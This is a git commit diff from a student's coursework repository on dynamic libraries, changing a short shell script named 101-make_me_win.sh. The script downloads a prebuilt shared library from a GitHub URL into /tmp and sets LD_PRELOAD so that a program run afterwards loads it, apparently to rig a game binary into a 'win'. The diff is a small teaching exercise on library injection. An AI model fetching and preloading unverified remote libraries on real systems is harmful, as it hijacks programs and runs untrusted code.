6c74e59706e1b2a357a034bb1dc455f607b4caa1
NketiaAsubontengErnest <nketiaernest18@gmail.com>
2022-12-12 09:50:52 -0800

    all

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp https://github.com/sammykingx/alx-low_level_programming/raw/main/0x18-dynamic_libraries/hacked.so
-export LD_PRELOAD=/tmp/hacked.so
+wget -O /tmp/libinject.so https://raw.github.com/NketiaAsubontengErnest/holbertonschool-low_level_programming/main/0x18-dynamic_libraries/libinject.so
+export LD_PRELOAD=/tmp/libinject.so
